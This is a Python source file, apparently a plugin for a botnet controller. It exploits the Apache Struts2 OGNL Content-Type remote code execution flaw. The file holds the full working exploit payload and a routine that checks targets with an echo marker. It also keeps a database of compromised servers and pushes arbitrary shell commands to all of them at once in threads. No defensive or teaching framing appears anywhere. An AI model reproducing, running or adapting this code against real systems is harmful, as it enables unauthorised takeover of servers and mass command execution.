# -*- coding: utf-8 -*-

import os
import time
import requests
from threading import Thread
from plugins.database import database
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class struts2:
    def __init__(self,):
        self.totalAttacks = 0
        self.db = database()

    def total(self,):
        total = self.db(self.db.servers.id > 0).select()
        return len(total)

    def sendBotnet(self,cmd,url):
        verify = self.exploit(url,'echo "065cd1ad45f099350c3b3404ca65761a0f6626eb"')
        if verify:
            if '065cd1ad45f099350c3b3404ca65761a0f6626eb' in verify:
                self.exploit(url,cmd)
                self.totalAttacks = self.totalAttacks + 1
            else:
                print 'Did not find the string test: %s' %url
        else:
            print 'Maybe its not vulnerable anymore: %s' %url

    def botnet(self,cmd):
        threads = []
        for server in self.db(self.db.servers.id > 0).select():
            t1 = Thread(target=self.sendBotnet, args=(cmd,server.url))
            threads.append(t1)
            t1.start()
        for thread in threads:
            thread.join()
        return self.totalAttacks

    def list(self,):
        allServers = list()
        for server in self.db(self.db.servers.id > 0).select():
            allServers.append(str(server.id)+':'+server.url)
        return '\n'.join(allServers)

    def add(self,url,):
        if self.db(self.db.servers.url == url).select().first():
            return 'InDB'
        else:
            verify = self.exploit(url,'echo "065cd1ad45f099350c3b3404ca65761a0f6626eb"')
            if verify:
                if '065cd1ad45f099350c3b3404ca65761a0f6626eb' in verify:
                    self.db = database()
                    self.db.servers.insert(url=url)
                    self.db.commit()
                    return True
                else:
                    return False
            else:
                return False

    def exploit(self,url,cmd):
        payload = "Content-Type:%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"
        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            r = requests.get(url, headers=headers,verify=False,timeout=10,stream=True)
            response = r.content
        except Exception as e:
            response = False
            erroLog = os.path.abspath(os.path.join('logs','error.log'))
            open(erroLog,'a').write(url+'>>'+str(e)+'\n')
        return response
